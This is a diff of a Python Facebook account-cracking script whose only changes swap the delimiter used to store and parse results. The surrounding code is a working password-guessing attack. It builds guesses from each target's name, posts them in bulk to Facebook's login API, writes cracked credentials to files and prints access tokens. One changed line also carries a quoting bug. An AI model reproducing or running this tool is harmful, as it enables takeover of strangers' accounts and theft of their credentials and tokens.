@@ -146,12 +146,12 @@ class crack:
 			send = json.loads(r.get("https://b-api.facebook.com/method/auth.login", params=param, headers=headers).text)
 			if "session_key" in send or "EAAA" in send:
 				ok+=1
-				open('ok','a').write(user+'|'+pw+'\n')
+				open('ok','a').write(user+'◊'+pw+'\n')
 				print(f'\r \33[37;1m[\33[1;36mOK\33[1;37m] \33[1;36m{user}\33[1;37m ◊ \33[1;36m{pw}|{send["access_token"]}\33[37;1m                     ',end='')
 				break
 			elif "www.facebook.com" in send["error_msg"]:
 				cp+=1
-				open('cp','a').write(user+'|'+pw+'\n')
+				open('cp','a').write(user+'◊'+pw+'\n')
 				print(f'\r \33[1;36m[\33[1;37mCP\33[1;36m]\33[1;37m {user}\33[1;36m ◊ \33[1;37m{pw}\33[37;1m                      ',end='')
 				break
 				
@@ -166,11 +166,11 @@ class crack:
 				print(f'')
 				if(tip in ("02","2")):
 					for email in id:
-						uid,name=email.split("|")
+						uid,name=email.split("◊")
 						kirim.submit(self.crack,uid,pwList,name.lower())
 				elif(tip in ("01","1")):
 					for email in id:
-						uid,name=email.split("|")
+						uid,name=email.split("◊")
 						kirim.submit(self.crack2,uid,pwList,name.lower())
 		elif(pil in ("t","T")):
 			with Bool(max_workers=35) as kirim:
@@ -178,7 +178,7 @@ class crack:
 				tip=input(" \033[1;36m[\033[1;37m?\033[1;36m] \033[1;36mPilih \033[1;37m:\033[1;33m ")
 				print("")
 				for email in id:
-					uid,name=email.split("|")
+					uid,name=email.split("◊")
 					if(len(str(name.lower()))>=2):
 						pw=[name.lower()+'123',name.lower()+'12345']
 					elif(len(str(name.lower()))<=2):
@@ -197,7 +197,7 @@ class crack:
 				tip=input(" \033[1;36m[\033[1;37m?\033[1;36m] \033[1;36mPilih \033[1;37m:\033[1;33m ")
 				print('')
 				for email in id:
-					uid,name=email.split("|")
+					uid,name=email.split("◊")
 					if(len(str(name.lower()))>=2):
 						pw=[name.lower()+'123,name.lower()+12345']
 					elif(len(str(name.lower()))<=2):
